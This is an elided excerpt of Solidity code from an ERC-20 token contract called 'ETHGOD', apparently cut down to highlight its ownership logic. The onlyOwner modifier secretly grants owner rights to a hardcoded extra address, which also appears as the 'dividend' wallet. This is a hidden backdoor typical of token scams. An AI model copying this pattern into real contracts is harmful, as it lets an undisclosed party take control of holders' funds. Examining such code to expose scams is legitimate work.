...
contract Ownable is Context {
    ...
    function owner() public view returns (address) {
        ...
        modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0xa57056aA2A7BD511D51Ec36f063231AA071d3eaB) , "owner");
        _;
    }
...
contract ETHGOD  is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "ETHGOD";
    string private _symbol = "ETHGOD";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x4c55D4618B48868180Ec10562cb14561C438F6f4);
    address private _Marketing = 0x4c55D4618B48868180Ec10562cb14561C438F6f4;
    address public dividend = 0xa57056aA2A7BD511D51Ec36f063231AA071d3eaB;
